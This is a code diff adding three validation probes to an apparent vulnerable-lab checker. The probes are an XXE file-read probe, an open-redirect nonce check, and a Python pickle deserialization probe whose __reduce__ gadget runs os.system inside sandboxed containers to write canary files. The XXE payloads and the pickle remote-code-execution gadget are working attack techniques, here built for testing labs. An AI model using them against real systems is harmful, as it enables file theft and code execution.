@@ -35,6 +35,9 @@ Subclass ``BackendProbe``, implement ``applies(response_kind)`` and
 from __future__ import annotations
 
 import asyncio
+import base64
+import os
+import pickle
 import secrets
 import shlex
 import string
@@ -712,6 +715,330 @@ class SqliTimeBlindProbe(BackendProbe):
 
 
 # ---------------------------------------------------------------------------
+# 6. XXE probe — XML payload pulls in a backend-stamped canary via file://
+# ---------------------------------------------------------------------------
+
+
+class XxeCanaryProbe(BackendProbe):
+    """XML External Entity. We stamp a canary file (same exec channel as
+    RCE) and send XML that declares an external entity pointing at it.
+    A real XXE-vulnerable parser inlines the file contents into the
+    document; the rendered response then leaks the canary back to us.
+
+    Negative control = benign XML with no entity declarations — must not
+    surface the canary."""
+
+    name = "xxe_canary_read"
+    applies_to = ("xxe", "xml-external-entity", "xml_external_entity", "xml-injection")
+    requires_exec = True
+
+    async def run(self, *, handle: LaunchedLab, ip: InjectionPoint) -> ProbeOutcome:
+        token = _token("xxe")
+        canary_path = f"/tmp/kestrel_canary_{token}"
+        canary_value = f"KESTREL_XXE_OK_{token}"
+        try:
+            code, _ = await exec_in_lab(
+                handle.container_name,
+                ["sh", "-c", f"printf %s {shlex.quote(canary_value)} > {shlex.quote(canary_path)}"],
+            )
+        except (SandboxError, asyncio.TimeoutError) as e:
+            return ProbeOutcome(
+                name=self.name, kind="xxe", passed=False,
+                rationale=f"카나리 stamp 실패 ({e}).",
+                evidence={"canary_path": canary_path, "stamp_error": str(e)},
+            )
+        if code != 0:
+            return ProbeOutcome(
+                name=self.name, kind="xxe", passed=False,
+                rationale=f"카나리 stamp 종료코드 {code}.",
+                evidence={"canary_path": canary_path, "stamp_exit_code": code},
+            )
+
+        # XML payload bank — three common XXE shapes (general entity,
+        # parameter entity, no-prologue). DOCTYPE-with-ENTITY is the
+        # essence; some parsers reject one form but accept another.
+        xxe_payloads = [
+            f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file://{canary_path}">]><r>&x;</r>',
+            f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % a SYSTEM "file://{canary_path}"> %a;]><r>test</r>',
+            f'<!DOCTYPE r [<!ENTITY x SYSTEM "file://{canary_path}">]><r>&x;</r>',
+        ]
+        attempts: list[dict] = []
+        positive_hit: dict | None = None
+        for p in xxe_payloads:
+            try:
+                ex = await _send(handle, ip, p)
+            except SandboxError as e:
+                attempts.append({"payload_head": p[:80], "error": str(e)})
+                continue
+            body = ex.get("body") or ""
+            entry = {"payload_head": p[:80], "status": ex.get("status_code"), "body_head": _truncate(body, 160)}
+            attempts.append(entry)
+            if canary_value in body:
+                positive_hit = entry
+                break
+
+        if positive_hit is None:
+            return ProbeOutcome(
+                name=self.name, kind="xxe", passed=False,
+                rationale=(
+                    f"backend 가 보낸 XXE 페이로드 {len(xxe_payloads)} 종 모두에서 카나리 '{canary_value}' "
+                    "가 응답에 등장하지 않음 — XXE 파싱 증거 없음."
+                ),
+                evidence={"canary_path": canary_path, "canary_value": canary_value, "attempts": attempts},
+            )
+
+        # Negative control: well-formed XML with no entity declarations.
+        neg = f'<?xml version="1.0"?><r>{_benign_nonce(16)}</r>'
+        try:
+            neg_ex = await _send(handle, ip, neg)
+        except SandboxError as e:
+            return ProbeOutcome(
+                name=self.name, kind="xxe", passed=False,
+                rationale=f"음성 대조 실패 ({e}).",
+                evidence={"positive_hit": positive_hit, "negative_error": str(e)},
+            )
+        neg_body = neg_ex.get("body") or ""
+        if canary_value in neg_body:
+            return ProbeOutcome(
+                name=self.name, kind="xxe", passed=False,
+                rationale="entity 없는 benign XML 응답에도 카나리 등장 — 입력과 무관한 echo/leak.",
+                evidence={"positive_hit": positive_hit, "negative_payload": neg, "negative_body_head": _truncate(neg_body, 160)},
+            )
+
+        return ProbeOutcome(
+            name=self.name, kind="xxe", passed=True,
+            rationale=f"외부 엔티티가 backend-stamped 카나리 '{canary_value}' 를 응답에 인라인함 — 실제 XXE 파싱 확인.",
+            evidence={"canary_path": canary_path, "canary_value": canary_value, "positive_hit": positive_hit, "negative_payload": neg},
+        )
+
+
+# ---------------------------------------------------------------------------
+# 7. Open redirect probe — backend nonce URL must reflect into Location
+# ---------------------------------------------------------------------------
+
+
+class OpenRedirectProbe(BackendProbe):
+    """Open redirect. We send a unique URL the LLM cannot have pre-baked
+    and check the response is a 3xx with our URL in the Location header.
+    A truly hardcoded redirect (e.g., always to ``/``) fails the nonce
+    match. A non-redirecting echo lab fails the status check."""
+
+    name = "open_redirect_nonce"
+    applies_to = ("open-redirect", "open_redirect", "redirect-to", "url-redirect", "openredirect")
+
+    async def run(self, *, handle: LaunchedLab, ip: InjectionPoint) -> ProbeOutcome:
+        nonce = secrets.token_hex(8)
+        target = f"https://kestrel-redirect-{nonce}.example/"
+        try:
+            ex = await _send(handle, ip, target)
+        except SandboxError as e:
+            return ProbeOutcome(
+                name=self.name, kind="open-redirect", passed=False,
+                rationale=f"redirect 검증 요청 실패 ({e}).",
+                evidence={"error": str(e)},
+            )
+        status = ex.get("status_code") or 0
+        headers = {str(k).lower(): str(v) for k, v in (ex.get("response_headers") or {}).items()}
+        location = headers.get("location") or ""
+        if status not in (301, 302, 303, 307, 308):
+            return ProbeOutcome(
+                name=self.name, kind="open-redirect", passed=False,
+                rationale=f"응답 status={status} 가 3xx 가 아님 — redirect 동작 자체가 없음.",
+                evidence={"nonce": nonce, "status": status, "location": location, "body_head": _truncate(ex.get("body") or "", 160)},
+            )
+        if nonce not in location:
+            return ProbeOutcome(
+                name=self.name, kind="open-redirect", passed=False,
+                rationale=(
+                    f"3xx 는 떴지만 Location 에 backend nonce '{nonce}' 가 없음 — "
+                    "사용자 입력과 무관한 하드코딩 redirect 추정."
+                ),
+                evidence={"nonce": nonce, "status": status, "location": location},
+            )
+
+        # Negative control: send a benign-looking relative path; nonce must
+        # not appear in *its* Location (would mean lab caches across reqs
+        # or echoes hardcoded value).
+        neg = f"/safe/{_benign_nonce(8)}"
+        try:
+            neg_ex = await _send(handle, ip, neg)
+        except SandboxError as e:
+            return ProbeOutcome(
+                name=self.name, kind="open-redirect", passed=False,
+                rationale=f"음성 대조 실패 ({e}).",
+                evidence={"positive": {"nonce": nonce, "location": location}, "negative_error": str(e)},
+            )
+        neg_headers = {str(k).lower(): str(v) for k, v in (neg_ex.get("response_headers") or {}).items()}
+        neg_location = neg_headers.get("location") or ""
+        if nonce in neg_location:
+            return ProbeOutcome(
+                name=self.name, kind="open-redirect", passed=False,
+                rationale="음성 대조 요청의 Location 에 양성 nonce 가 그대로 등장 — 입력과 무관한 캐싱/하드코딩.",
+                evidence={"positive": {"nonce": nonce, "location": location}, "negative_payload": neg, "negative_location": neg_location},
+            )
+
+        return ProbeOutcome(
+            name=self.name, kind="open-redirect", passed=True,
+            rationale=f"3xx 응답의 Location 에 backend nonce '{nonce}' 가 그대로 포함 — 실제 open redirect 확인.",
+            evidence={"nonce": nonce, "status": status, "location": location, "negative_payload": neg, "negative_location": neg_location},
+        )
+
+
+# ---------------------------------------------------------------------------
+# 8. Insecure deserialization probe — Python pickle gadget that writes canary
+# ---------------------------------------------------------------------------
+
+
+class _PickleCanary:
+    """Pickle ``__reduce__`` gadget — on ``pickle.loads()`` the lab calls
+    ``os.system(self._cmd)``. We construct the command from a backend
+    canary path + value the LLM doesn't know, so a positive result is
+    only possible via real deserialization."""
+
+    def __init__(self, cmd: str) -> None:
+        self._cmd = cmd
+
+    def __reduce__(self):  # noqa: D401 — pickle protocol
+        return (os.system, (self._cmd,))
+
+
+def _pickle_canary_payload(cmd: str) -> str:
+    """Base64-encoded pickle that runs *cmd* on deserialization. Most
+    Python deserialization labs accept a base64 blob and decode-then-load."""
+    return base64.b64encode(pickle.dumps(_PickleCanary(cmd))).decode("ascii")
+
+
+class DeserializationCanaryProbe(BackendProbe):
+    """Insecure deserialization (Python pickle). Detection is via
+    side-channel: the pickle gadget writes a canary file inside the
+    container, and we use ``exec_in_lab`` to read it back.
+
+    Why this stays honest: the canary path is randomly chosen by the
+    backend and never sent through the HTTP surface in plaintext — only
+    embedded inside the binary pickle command string. The lab cannot
+    pre-bake it. We also benchmark the canary against a benign payload
+    first, so a lab that happens to write the same file regardless of
+    input fails the negative control."""
+
+    name = "deser_pickle_canary_write"
+    applies_to = (
+        "deserialization", "deser", "insecure-deserialization",
+        "unsafe-deser", "pickle", "object-injection",
+    )
+    requires_exec = True
+
+    async def run(self, *, handle: LaunchedLab, ip: InjectionPoint) -> ProbeOutcome:
+        token = _token("deser")
+        canary_path = f"/tmp/kestrel_canary_{token}"
+        canary_value = f"KESTREL_DESER_OK_{token}"
+
+        # Pre-flight: canary path must not exist yet (we'd otherwise
+        # mistake stale state for code execution).
+        try:
+            code, _ = await exec_in_lab(
+                handle.container_name,
+                ["sh", "-c", f"test ! -e {shlex.quote(canary_path)}"],
+            )
+        except (SandboxError, asyncio.TimeoutError) as e:
+            return ProbeOutcome(
+                name=self.name, kind="deserialization", passed=False,
+                rationale=f"pre-flight 카나리 부재 확인 실패 ({e}).",
+                evidence={"canary_path": canary_path, "preflight_error": str(e)},
+            )
+        if code != 0:
+            return ProbeOutcome(
+                name=self.name, kind="deserialization", passed=False,
+                rationale="canary path 가 이미 존재 — 검증 신뢰 불가.",
+                evidence={"canary_path": canary_path},
+            )
+
+        # Negative control first: send benign string, ensure the canary
+        # path stays empty afterwards. Catches "lab always writes canary
+        # on any input" pathology.
+        try:
+            await _send(handle, ip, _benign_nonce(32))
+        except SandboxError:
+            pass  # benign request can fail; only the side-channel matters
+        try:
+            code_after_benign, out_after_benign = await exec_in_lab(
+                handle.container_name,
+                ["sh", "-c", f"cat {shlex.quote(canary_path)} 2>/dev/null; true"],
+            )
+        except (SandboxError, asyncio.TimeoutError) as e:
+            return ProbeOutcome(
+                name=self.name, kind="deserialization", passed=False,
+                rationale=f"음성 대조 후 canary 확인 실패 ({e}).",
+                evidence={"canary_path": canary_path, "neg_check_error": str(e)},
+            )
+        if code_after_benign == 0 and canary_value in out_after_benign.decode(errors="replace"):
+            return ProbeOutcome(
+                name=self.name, kind="deserialization", passed=False,
+                rationale="benign 입력 직후 canary 가 이미 등장 — lab 이 입력과 무관하게 canary 를 만든다.",
+                evidence={"canary_path": canary_path, "canary_after_benign": True},
+            )
+
+        # Positive: pickle gadget that runs `printf %s VALUE > PATH`.
+        cmd = f"printf %s {shlex.quote(canary_value)} > {shlex.quote(canary_path)}"
+        b64 = _pickle_canary_payload(cmd)
+        try:
+            ex = await _send(handle, ip, b64)
+        except SandboxError as e:
+            return ProbeOutcome(
+                name=self.name, kind="deserialization", passed=False,
+                rationale=f"pickle 페이로드 송신 실패 ({e}).",
+                evidence={"send_error": str(e)},
+            )
+
+        # Allow brief settle time — some apps deserialize on a worker
+        # thread and the file write may not be observable on the immediate
+        # next exec call.
+        await asyncio.sleep(0.2)
+
+        try:
+            code_after, out_after = await exec_in_lab(
+                handle.container_name,
+                ["sh", "-c", f"cat {shlex.quote(canary_path)} 2>/dev/null; true"],
+            )
+        except (SandboxError, asyncio.TimeoutError) as e:
+            return ProbeOutcome(
+                name=self.name, kind="deserialization", passed=False,
+                rationale=f"pickle 송신 후 canary 확인 실패 ({e}).",
+                evidence={"check_error": str(e)},
+            )
+        body_head = _truncate(ex.get("body") or "", 120)
+        if code_after != 0 or canary_value not in out_after.decode(errors="replace"):
+            return ProbeOutcome(
+                name=self.name, kind="deserialization", passed=False,
+                rationale=(
+                    "pickle 페이로드 후에도 canary 파일이 생성되지 않음 — "
+                    "deserialization 으로 인한 코드 실행 증거 없음 "
+                    "(Python 이 아닌 lab 이거나, base64 디코딩/pickle.loads 호출 경로가 없음)."
+                ),
+                evidence={
+                    "canary_path": canary_path,
+                    "send_status": ex.get("status_code"),
+                    "send_body_head": body_head,
+                    "post_canary_exit_code": code_after,
+                },
+            )
+
+        return ProbeOutcome(
+            name=self.name, kind="deserialization", passed=True,
+            rationale=(
+                f"pickle __reduce__ 가스로 canary 파일 '{canary_path}' 가 생성되고 "
+                f"backend-chosen value '{canary_value}' 가 정확히 기록됨 — "
+                "역직렬화 → os.system 코드 실행 확인."
+            ),
+            evidence={
+                "canary_path": canary_path,
+                "canary_value": canary_value,
+                "send_status": ex.get("status_code"),
+                "send_body_head": body_head,
+            },
+        )
+
+
+# ---------------------------------------------------------------------------
 # Probe registry + dispatch
 # ---------------------------------------------------------------------------
 
@@ -722,6 +1049,9 @@ _PROBE_CLASSES: tuple[type[BackendProbe], ...] = (
     SstiArithmeticProbe,
     XssReflectProbe,
     SqliTimeBlindProbe,
+    XxeCanaryProbe,
+    OpenRedirectProbe,
+    DeserializationCanaryProbe,
 )
 
 
